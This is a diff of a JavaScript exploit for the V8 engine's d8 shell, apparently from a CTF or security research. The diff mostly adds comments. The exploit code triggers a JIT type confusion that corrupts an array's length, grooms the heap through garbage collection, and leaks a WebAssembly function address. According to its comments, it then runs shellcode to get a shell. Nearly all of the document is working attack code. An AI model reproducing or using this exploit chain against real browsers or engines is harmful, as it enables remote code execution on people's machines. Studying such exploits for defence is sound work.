@@ -1,41 +1,55 @@
-
-
 function f(o, g)
 {
-	const x = o.x;// = 0xdead;
+	const x = o.x;
+	// first CheckMap
+	// if we change this to o.x = 1,
+	// JSStoreNamed will not be converted to StoreField
+	// not sure why
 	g();
 	o.d = 0x2000;
+	// rewrite length field of array to 0x2000
 }
 
-// function f(x)
-// {
-// 	const b = x === 1 ? 1n : 2n;
-// 	return Number(b) + 3;
-// }
 a = [1.1];
 for (var i = 0; i < 0x1000; i++)
 {
 	f({x:1,y:2,z:3,l:4,a:5,b:6,c:7,d:8,e:9}, ()=>1);
 	f({x:1,y:2,z:3,l:4,a:5,b:6,c:7,d:8,e:9}, ()=>2);
 	f({x:1,y:2,z:3,l:4,a:5,b:6,c:7,d:8,e:9}, ()=>3);
+	// trigger JIT
+	// call with different g is to prevent inlining optimization
 }
 obj = {x:1,y:2,z:3,l:4,a:5,b:6,c:7,d:8,e:9};
 arr = [1.1, 2.2];
 const ab = new ArrayBuffer(0x123);
 const sig = {a:0xdead,b:0xbeef,c:(()=>1)};
+// put an array, a ArrayBuffer, a signature object
+// after obj
+// this even holds after GC is triggered
 
 function g()
 {
 	obj.__defineGetter__('xx',()=>2);
 	obj.__defineGetter__('xx',()=>2);
+	// shrink size of obj
 	for (var i = 0; i < 0x10; i++)
 		new ArrayBuffer(0x1000000);
+	// trigger GC
 }
 
 f(obj, g);
-//console.log(arr);
+// trigger vulnerability
+
 if (arr.length !== 0x2000)
 	throw Error("failed to corrupt array length");
+// now length of array should already be corrupted
+
+// then here is util functions for exploitation
+// I have not putted them before
+// because if we do so, object layout after GC will change
+// to be specific, `arr` cannot lay just after `obj`
+// not sure why, maybe it's because more objects are allocated,
+// which changes behavior of GC
 function getWMain()
 {
 	const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
@@ -74,6 +88,7 @@ dp(ab);
 dp(sig);
 
 sig.c = wmain;
+// change sig.c to wmain in order to leak it
 
 var backingPos, wmainAddr;
 for (let i = 0; i < arr.length-2; i++)
@@ -125,3 +140,7 @@ wmain();
 // execute the shellcode
 
 throw Error("failed to get shell");
+
+// another point to note is that the exploit fails
+// when being run in release mode using gdb
+// not sure why gdb changes behavior of the d8
